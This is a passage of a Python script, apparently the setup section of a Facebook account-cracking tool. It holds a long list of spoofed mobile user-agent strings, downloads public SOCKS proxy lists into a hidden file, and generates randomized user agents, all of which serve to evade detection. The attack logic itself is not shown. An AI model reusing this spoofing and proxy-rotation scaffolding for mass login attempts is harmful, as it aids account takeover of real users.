Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrom']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
        prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
        open('.prox.txt','w').write(prox)
except Exception as e:
        print(' ')
prox=open('.prox.txt','r').read().splitlines()

try:
        prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
        open('.prox.txt','w').write(prox)
except Exception as e:
        prox=open('.prox.txt','r').read().splitlines()

try:
        prox= requests.get('https://raw.githubusercontent.com/tiger-krd/COBRA/main/.prox.txt').text
        open('.prox.txt','w').write(prox)
except Exception as e:
        prox=open('.prox.txt','r').read().splitlines()

try:
        prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
        open('.prox.txt','w').write(prox)
except Exception as e:
        prox=open('.prox.txt','r').read().splitlines()
for x in range(1000):
    rr = random.randint
    rc = random.choice
    A7A = f"Mozilla/5.0 (Linux; Android {str(rr(3,10))}; Nokia 1000 4G Build/GRK39F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(25,100))}.0.{str(rr(2111,3999))}.{str(rr(173,299))} Mobile Safari/535.2"
    A7A1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,10))}; Nokia 3115 Build/IMM76D) AppleWebKit/537.7 (KHTML, like Gecko)  Chrome/{str(rr(25,100))}.0.{str(rr(2111,3999))}.{str(rr(73,399))} Mobile Safari/537.4"
    A7A2  = f"Mozilla/5.0 (Android; Android {str(rr(7,12))}; LG-H920 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/534.0"
    A7A3  = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; Elephone P3000 Build/KTU84P) AppleWebKit/600.33 (KHTML, like Gecko)  Chrome/{str(rr(33,199))}.0.{str(rr(1500,2900))}.{str(rr(75,450))} Mobile Safari/536.1"
